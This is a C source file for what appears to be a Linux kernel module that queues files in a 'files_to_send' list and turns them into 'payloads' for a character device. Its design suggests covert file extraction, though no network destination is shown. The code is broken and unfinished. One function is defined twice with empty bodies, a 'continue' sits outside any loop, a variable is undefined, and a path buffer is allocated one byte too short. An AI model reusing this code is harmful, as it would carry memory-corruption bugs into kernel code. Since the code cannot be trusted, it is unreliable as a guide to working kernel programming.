#include "fs/payload_generator.h"
#include "chrdev/chrdev.h"
#include "file_info.h"

size_t DEFAULT_PAYLOAD_CHUNKS_SIZE = 32; // in bytes

struct file_info_cache current_file;

void read_file_chunks(struct file_data_cache *current_file, struct file *fp)
{

}

int read_file_chunks(struct file_data_cache *current_file)
{

}


void process_next_file(struct file_data_cache *current_file)
{
    struct file_info *next_file;

    // check if the list is empty.
    mutex_lock(&files_to_send_mutex);
    bool is_list_empty = list_empty(&files_to_send);
    mutex_unlock(&files_to_send_mutex);

    if (is_list_empty) {
        current_file->file_path = NULL;
        current_file->position = 0;
        return;    
    }

    // if it is not empty, read its first entry.
    mutex_lock(&files_to_send_mutex);
    next_file = list_first_entry(&files_to_send, struct file_info, l_head);
    if (NULL == next_file) {
        continue;
    }

    // free the previous file path if needed
    if (NULL != current_file->file_path) {
        kfree(current_file->file_path);
    }

    size_t next_file_path_length = strlen(next_file->file_path);
    current_file->file_path = (char*)kmalloc(next_file_path_length, GFP_KERNEL);
    if (NULL == current_file->file_path) {
        goto cleanup;
    }
    current_file->position = 0;

    // copy the new file name
    memcpy(current_file->file_path, next_file->file_path, next_file_path_length);
    list_del(pos);
    kfree(next_file);

    // now we need to fill the file_data_cache struct with both the file's metadata and chunks/
    // TODO: support saving only X chunks (for dealing with large files)
    

cleanup:
    mutex_unlock(&files_to_send_mutex);
    return;
}

int generate_payload(char *buffer, size_t *length)
{
    if (NULL == buffer || NULL == length) {
        // invalid arguments received
        return -EINVAL;
    }

    if (NULL == current_file.file_path) {
        // no files to read
        return -EIO;
    }

    char array[2] = { 0xdd, 0xed};
    memcpy((void*)buffer, array, 2);
    *length = 2;
    
    return 0;
}

void setup_payload_generator()
{
    // TODO: make atomic!
    get_payload_func = &generate_payload;
}

size_t get_default_payload_chunk_size(void)
{
    return DEFAULT_PAYLOAD_CHUNKS_SIZE;
}